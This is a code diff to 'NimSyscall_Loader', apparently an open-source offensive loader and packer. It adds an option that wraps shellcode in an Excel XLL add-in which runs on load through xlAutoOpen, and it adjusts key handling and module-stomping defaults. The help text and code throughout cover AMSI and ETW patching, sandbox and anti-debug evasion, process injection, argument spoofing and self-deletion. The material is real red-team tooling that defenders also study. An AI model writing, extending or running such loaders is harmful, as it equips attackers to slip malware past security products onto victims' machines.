@@ -56,7 +56,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v2.1                                            
+                                                                 v2.2                                            
 
 """
 
@@ -65,10 +65,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 2.1
+NimSyscall_Loader v 2.2
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -126,6 +126,7 @@ Options:
       --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
       --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
       --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
+      --xll    Generate an XLL file (Excel Add-In) instead of an executable
 
 [evasion]
 
@@ -257,6 +258,7 @@ var
     uselyrics: bool = false
     psobfs: bool = false
     cpl: bool = false
+    xll: bool = false
     replaceNimMain: bool = false
     big: bool
     sourceonly: bool = false
@@ -364,24 +366,19 @@ var
     carokannthread: bool = false
     stomb: bool = false
     stombDll: string = "chakra.dll"
-    stombFunc: string = "JsCreateThreadService"
-    stombFunc2: string = "MemProtectHeapUnprotectCurrentThread"
+    stombFunc: string = "JsRunScript" # this combi works for client and server
+    stombFunc2: string = "MemProtectHeapUnprotectCurrentThread" # this combi works for client and server
     restore: bool = false
     noAntiEmulate: bool = false
     poolparty: int = 1
     usepoolparty: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 2.1")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 2.2")
 
 if args["--file"]:
   let fname = args["--file"]
   filename = fmt"{fname}"
   echo filename
-
-if args["--key"]:
-  let keyname = args["--key"]
-  envkey = fmt"{keyname}"
-  customKey = true
 
 if args["--environmentalKey"]:
   if(customKey == false):
@@ -396,6 +393,14 @@ if args["--environmentalKey"]:
       environmentalDomain = true
     if(m.contains("username")):
       environmentalUsername = true
+
+if args["--key"]:
+  let keyname = args["--key"]
+  envkey = fmt"{keyname}"
+  customKey = true
+  # if environmentalDomain or environmentalUsername is true, make the key lowercase
+  if(environmentalKey):
+    envkey = envkey.toLower()
 
 if args["--stegofile"]:
     useStego = true
@@ -570,6 +575,14 @@ if args["--cpl"]:
   dll_out = true
   cpl = true
 
+if args["--xll"]:
+  dllhijack = false
+  dll_out = true
+  xll = true
+  if args["--remoteinject"]:
+    wait = false
+  # set dllexportfunctions to xlAutoOpen, as this is the default function for Excel Add-Ins
+  dllexportfunctions = @["xlAutoOpen"]
 
 if args["--interactivePS"]:
     csharp = true
@@ -584,6 +597,8 @@ when system.hostOS == "windows":
         outfile.add(fmt"\\{customLoaderName}.dll")
     elif(cpl):
         outfile.add(fmt"\\{customLoaderName}.cpl")
+    elif(xll):
+        outfile.add(fmt"\\{customLoaderName}.xll")
     else:
         outfile.add(fmt"\\{customLoaderName}.exe")
 else:
@@ -591,6 +606,8 @@ else:
         outfile.add(fmt"/{customLoaderName}.dll")
     elif(cpl):
         outfile.add(fmt"/{customLoaderName}.cpl")
+    elif(xll):
+        outfile.add(fmt"/{customLoaderName}.xll")
     else:
         outfile.add(fmt"/{customLoaderName}.exe")
 
@@ -1640,7 +1657,8 @@ when defined(defaultMain):
     when not defined(service):
         when defined(notcloned):
             when not defined(proxy):
-                discard main(nil)
+                when not defined(xll):
+                    discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
@@ -1652,12 +1670,14 @@ let LoadAssemblyStubNoArgs = """
 when not defined(proxy):
     when not defined(service):
         when not defined(cloned):
-            discard main(nil)
+            when not defined(xll):
+                discard main(nil)
 
 when defined(defaultMain):
     when not defined(service):
         when defined(notcloned):
-            discard main(nil)
+            when not defined(xll):
+                discard main(nil)
 """
 
 
@@ -2956,6 +2976,17 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
 let DllCustomExportStub = """
 proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
     NimMain()
+    when defined(xll):
+        # Create a Thread on the main function
+        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+        # when defined remoteinject CloseHandle
+        when defined(remoteinject):
+            CloseHandle(threadHandle)
+        else:
+            # Wait for the thread to finish
+            WaitForSingleObject(threadHandle, INFINITE)
+
+    
     return true
 """
 
@@ -3597,7 +3628,7 @@ proc CreatedInterrupt(): bool =
 let DomainKeyStub * = """
 
 envkey = getDomain()
-envkey2 = envkey
+envkey2 = envkey.toLower() # lowercase to avoid issues with case sensitivity
 when defined(verbose):
     echo obf("[*] Domain for the key: "), envkey2
 
@@ -3613,6 +3644,8 @@ when defined(environmentalDomain):
 else:
     envkey = getUsername()
     envkey2 = envkey
+
+envkey = envkey.toLower() # lowercase to avoid issues with case sensitivity
 
 when defined(verbose):
     echo obf("[*] Final Key: "), envkey2
@@ -3997,7 +4030,7 @@ if (shellcode):
             stub.add(ShellcoderemoteinjectStub)
         stub.add(getRandStub())
 
-if(dll_out or cpl):
+if(dll_out or cpl or xll):
     if ((hide == false) and (apiHide == false)):
         stub.add(DLLNoHideStub)
 
@@ -4023,7 +4056,7 @@ if (sleepycrypt):
     stub.add(LocalInjectGetSyscallStubSleepStub)
     #stub.add(SleepyCryptLoopExecute)
 
-if(dll_out or cpl):
+if(dll_out or cpl or xll):
     if (dllProxy):
         stub.add(DLLProxyStub)
     else:
@@ -4299,7 +4332,7 @@ if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
 if (metadata and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
-    if (dll_out or cpl):
+    if (dll_out or cpl or xll):
         when system.hostOS == "windows":
             basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
         else:
@@ -4319,6 +4352,9 @@ if (compileX86):
 if (wow64):
     basicCompileFlags.add("-d:wow64 ")
 
+if(xll):
+    basicCompileFlags.add("-d:xll ")
+
 if not noDInvoke:
     basicCompileFlags.add("-d:DInvoke ")
 
@@ -4331,7 +4367,7 @@ if (sleepinbetween > 0):
 if localCreateThread:
     basicCompileFlags.add("-d:LocalCreateThread ")
 
-if (dll_out or cpl):
+if (dll_out or cpl or xll):
     #if (processname == ""): # Why did I do that? It make no sense.
     #    basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
     #else:
@@ -4599,6 +4635,8 @@ if(exists):
         var extension: string = ".exe"
         if (cpl):
             extension = ".cpl"
+        elif (xll):
+            extension = ".xll"
         elif(dll_out):
             extension = ".dll"
         if system.hostOS == "linux":
